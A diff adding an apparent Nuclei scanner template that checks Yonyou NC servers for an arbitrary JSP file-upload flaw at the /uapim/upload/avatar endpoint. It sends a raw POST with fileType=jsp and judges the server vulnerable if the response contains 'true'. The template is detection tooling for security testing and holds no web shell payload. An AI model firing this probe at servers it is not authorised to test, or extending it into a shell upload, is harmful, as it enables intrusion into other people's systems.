@@ -1,0 +1,29 @@
+id: yonyou-nc-avatar-fileupload
+
+info:
+  name: yonyou-nc-avatar-fileupload
+  author: msk
+  severity: critical
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  usercode: "{{to_lower(rand_base(4))}}"
+
+
+  
+http:
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode={{usercode}}&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'true')"
+
